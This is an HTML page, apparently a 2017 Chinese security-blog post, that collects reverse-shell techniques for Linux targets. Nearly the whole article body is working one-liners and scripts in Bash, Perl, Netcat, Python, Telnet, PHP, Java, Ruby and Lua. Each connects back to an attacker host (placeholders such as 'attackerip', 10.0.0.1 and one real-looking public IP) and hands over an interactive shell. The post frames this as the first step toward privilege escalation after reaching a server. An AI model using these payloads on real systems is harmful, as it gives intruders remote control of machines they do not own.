@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>linux反弹shell姿势 - 小黑屋</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="遇到linux服务器，马上想到反弹shell到本地进行溢出等提权尝试,这里搜集了一些常用的反弹姿势。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux反弹shell姿势">
+<meta property="og:url" content="http://das.scusec.org/2017/03/06/Reverse_Shell/index.html">
+<meta property="og:site_name" content="小黑屋">
+<meta property="og:description" content="遇到linux服务器，马上想到反弹shell到本地进行溢出等提权尝试,这里搜集了一些常用的反弹姿势。">
+<meta property="og:image" content="http://p1.bqimg.com/567571/2224a823829b8146.png">
+<meta property="og:updated_time" content="2017-03-06T08:53:04.741Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="linux反弹shell姿势">
+<meta name="twitter:description" content="遇到linux服务器，马上想到反弹shell到本地进行溢出等提权尝试,这里搜集了一些常用的反弹姿势。">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="/webfonts/ptserif/main.css" rel='stylesheet' type='text/css'>
+  <link href="/webfonts/source-code-pro/main.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
+      <a id="logo" class="logo logo-text" href="/">小黑屋</a>
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/">首页</a>
+        
+          <a class="main-nav-link" href="/archives">文档</a>
+        
+          <a class="main-nav-link" href="/categories">分类</a>
+        
+          <a class="main-nav-link" href="/tags">标签</a>
+        
+          <a class="main-nav-link" href="/links">链接</a>
+        
+          <a class="main-nav-link" href="/share">分享</a>
+        
+          <a class="main-nav-link" href="/about">关于</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        <div id="search-form-wrap">
+          <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://das.scusec.org"></form>
+        </div>
+      </nav>
+    </div>
+  </div>
+</header>
+    <section id="main" class="outer"><article id="post-Reverse_Shell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      linux反弹shell姿势
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/2017/03/06/Reverse_Shell/" class="article-date">
+  <time datetime="2017-03-06T08:53:04.741Z" itemprop="datePublished">2017-03-06</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/安全笔记/">安全笔记</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="http://p1.bqimg.com/567571/2224a823829b8146.png" alt="image"></p>
+<p>遇到linux服务器，马上想到反弹shell到本地进行溢出等提权尝试,这里搜集了一些常用的反弹姿势。<br><a id="more"></a></p>
+<ul>
+<li>首先，选一个未被目标防火墙过滤的TCP端口</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacker$ nc <span class="operator">-l</span> -v attackerip <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Bash</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/<span class="number">173.214</span>.<span class="number">173.151</span>/<span class="number">8080</span> <span class="number">0</span>&lt;&amp;<span class="number">1</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span>.<span class="number">0.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>&lt;&amp;<span class="number">196</span>;<span class="built_in">exec</span> <span class="number">196</span>&lt;&gt;/dev/tcp/attackerip/<span class="number">4444</span>; sh &lt;&amp;<span class="number">196</span> &gt;&amp;<span class="number">196</span> <span class="number">2</span>&gt;&amp;<span class="number">196</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="built_in">exec</span> <span class="number">5</span>&lt;&gt;/dev/tcp/attackerip/<span class="number">4444</span></span><br><span class="line"><span class="number">2</span>. cat &lt;&amp;<span class="number">5</span> | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> <span class="number">2</span>&gt;&amp;<span class="number">5</span> &gt;&amp;<span class="number">5</span>; <span class="keyword">done</span>  <span class="comment"># or:</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line <span class="number">0</span>&lt;&amp;<span class="number">5</span>; <span class="keyword">do</span> <span class="variable">$line</span> <span class="number">2</span>&gt;&amp;<span class="number">5</span> &gt;&amp;<span class="number">5</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Perl</strong>           </li>
+</ul>
+<p>不依赖于/bin/sh</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure>
+<p>如果是目标基于windows，还可以</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure>
+<p>也可上传一个<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.pl</span></span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"><span class="variable">$i</span>=<span class="string">"x.x.x.x"</span>;</span><br><span class="line"><span class="variable">$p</span>=<span class="number">8080</span>;</span><br><span class="line"><span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="keyword">getprotobyname</span>(<span class="string">"tcp"</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">open</span>(STDIN,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">		<span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">		<span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">		<span class="keyword">exec</span>(<span class="string">"/bin/sh -i"</span>);</span><br><span class="line">			&#125;;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><strong>Netcat</strong>  </li>
+</ul>
+<p>取决于nc的版本，在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个GAPING_SECURITY_HOLE常量)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="operator">-e</span> /bin/sh attackerip <span class="number">4444</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh | nc attackerip <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果没有权限使用mkfifo /tmp/backpipe也可以创建一个管道</span><br><span class="line">rm <span class="operator">-f</span> /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip <span class="number">4444</span> <span class="number">0</span>/tmp/p</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. mknod /tmp/backpipe p</span><br><span class="line"><span class="number">2</span>. /bin/sh <span class="number">0</span>&lt;/tmp/backpipe | nc attackerip listenport <span class="number">1</span>&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>python</strong></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"x.x.x.x"</span>,<span class="number">8080</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#2.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'10.16.44.100'</span> <span class="comment"># The remote host</span></span><br><span class="line">PORT = <span class="number">443</span> <span class="comment"># The same port as used by the server</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># connect to attacker machine</span></span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line"><span class="comment"># send we are connected</span></span><br><span class="line">s.send(<span class="string">'[*] Connection Established!'</span>)</span><br><span class="line"><span class="comment"># start loop</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment"># recieve shell command</span></span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># if its quit, then break out and close socket</span></span><br><span class="line"><span class="keyword">if</span> data == <span class="string">"quit"</span>: <span class="keyword">break</span></span><br><span class="line"><span class="comment"># do shell command</span></span><br><span class="line">proc = subprocess.Popen(data, shell=<span class="keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line"><span class="comment"># read output</span></span><br><span class="line">stdout_value = proc.stdout.read() + proc.stderr.read()</span><br><span class="line"><span class="comment"># send output to attacker</span></span><br><span class="line">s.send(stdout_value)</span><br><span class="line"><span class="comment"># close socket</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Telnet</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm <span class="operator">-f</span> /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip <span class="number">4444</span> <span class="number">0</span>/tmp/p</span><br></pre></td></tr></table></figure>
+<p>本地在4445端口监听<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet attackerip <span class="number">4444</span> | /bin/bash | telnet attackerip <span class="number">4445</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><strong>PHP</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>JAVA</strong></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Ruby</strong>    </li>
+</ul>
+<p>目标基于linux<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure></p>
+<p>目标基于windows<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><strong>lua</strong></li>
+</ul>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>
+<p>参考链接：<br><a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" target="_blank" rel="external">https://www.waitalone.cn/linux-shell-rebound-under-way.html</a></p>
+
+      
+    </div>
+    
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MS/">MS</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/03/06/Unserialize_vulnerabilities/" id="article-nav-newer" class="article-nav-link-wrap">
+      <div class="article-nav-title"><span>&lt;</span>&nbsp;
+        
+          JAVA反序列化漏洞
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/02/20/WP-content-Injection/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">WordPress REST API内容注入漏洞复现&nbsp;<span>&gt;</span></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+  
+  <section id="comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="post-Reverse_Shell" data-title="linux反弹shell姿势" data-url="http://das.scusec.org/2017/03/06/Reverse_Shell/"></div>
+    <!-- 多说评论框 end -->
+    <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+    <script type="text/javascript">
+    var duoshuoQuery = {short_name:'dassec'};
+      (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+      })();
+      </script>
+    <!-- 多说公共JS代码 end -->
+  </section>
+  </section>
+    <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 das&nbsp;
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, theme by <a href="http://github.com/ppoffice">PPOffice</a>，<a href="http://das.scusec.org/atom.xml">RSS</a>
+    </div>
+  </div>
+</footer>
+    
+
+<script src="/js/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>
+
+
+<script src="/js/script.js" type="text/javascript"></script>
+  </div>
+</body>
+</html>
